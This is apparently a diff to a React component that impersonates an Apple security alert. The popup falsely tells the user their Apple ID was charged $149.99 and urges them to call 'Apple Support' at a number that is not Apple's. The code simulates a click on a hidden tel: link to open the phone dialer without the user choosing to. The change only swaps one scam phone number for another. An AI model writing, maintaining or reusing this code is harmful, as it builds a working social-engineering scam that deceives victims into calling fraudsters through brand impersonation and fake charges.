@@ -19,7 +19,7 @@ const AppleAlertModal = forwardRef<AppleAlertModalHandle, AppleAlertModalProps>(
     // MUST be directly inside a user click, or simulated click
     // Using a temporary anchor tag is often more reliable on Safari/Chrome
     const link = document.createElement("a");
-    link.href = "tel:+18884498105";
+    link.href = "tel:+118888587485";
     link.style.display = "none";
     document.body.appendChild(link);
     link.click();
@@ -50,7 +50,7 @@ const AppleAlertModal = forwardRef<AppleAlertModalHandle, AppleAlertModalProps>(
           </h3>
 
           <p className="text-[15px] leading-tight text-black/80 mb-3">
-            Your Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security. Not you? Immediately call Apple Support <br />+1-888-449-8105 to Freeze it!.
+            Your Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security. Not you? Immediately call Apple Support <br />+1-18888587485 to Freeze it!.
           </p>
 
           {/* Actions */}
